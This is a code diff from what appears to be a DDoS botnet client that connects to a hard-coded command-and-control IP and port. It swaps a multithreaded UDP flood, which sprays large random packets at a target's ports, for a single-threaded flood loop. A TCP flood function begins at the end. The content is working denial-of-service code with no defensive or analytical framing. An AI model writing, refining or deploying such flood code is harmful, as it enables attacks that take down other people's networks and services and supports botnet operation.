@@ -13,26 +13,11 @@ C2_ADDRESS = "147.185.221.27"
 C2_PORT = 4887
 
 def attack_udp(ip, port, secs, size=65500):
-    end_time = time.time() + secs
-    threads = 20
-
-    def flood():
-        while time.time() < end_time:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            dport = random.randint(1, 65535) if port == 0 else port
-            data = random._urandom(size)
-            for _ in range(10):
-                s.sendto(data, (ip, dport))
-            s.close()
-
-    thread_list = []
-    for _ in range(threads):
-        t = threading.Thread(target=flood)
-        t.start()
-        thread_list.append(t)
-
-    for t in thread_list:
-        t.join()
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        dport = random.randint(1, 65535) if port == 0 else port
+        data = random._urandom(size)
+        s.sendto(data, (ip, dport))
 
 def attack_tcp(ip, port, secs, size=65500):
     while time.time() < secs:
